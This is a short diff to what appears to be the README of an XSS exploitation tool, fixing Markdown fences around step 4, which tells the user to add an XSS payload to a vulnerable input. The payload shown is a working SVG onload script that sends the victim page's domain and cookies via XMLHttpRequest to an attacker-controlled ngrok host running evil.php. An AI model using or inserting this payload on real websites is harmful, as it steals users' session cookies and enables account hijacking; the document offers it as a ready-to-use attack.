@@ -25,6 +25,6 @@ Please let me know if any problem... PR's wellcome :)
 
 
 4- Now add your XSS payload to vulnerable input.
-`
+```
 <svg onload="function a(){var url = `http://xxxxxxxxx.ngrok.io/evil.php?domain=${document.domain}&cookie=${document.cookie}`;var r=new XMLHttpRequest();r.open('GET', url, true);r.send();};a();">
-`
+```
